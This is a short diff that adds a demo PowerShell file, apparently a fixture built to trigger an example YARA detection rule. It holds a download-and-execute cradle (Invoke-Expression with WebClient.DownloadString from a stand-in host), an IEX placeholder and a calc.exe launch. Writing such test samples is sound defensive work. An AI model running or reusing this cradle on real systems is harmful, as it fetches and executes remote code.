@@ -1,0 +1,5 @@
+# Demo malicious-like script
+# This file includes suspicious PowerShell keywords to trigger the example YARA rule.
+Invoke-Expression (New-Object Net.WebClient).DownloadString('http://example.com/payload.ps1')
+IEX 'some encoded command'
+Start-Process 'cmd.exe' -ArgumentList '/c calc.exe'
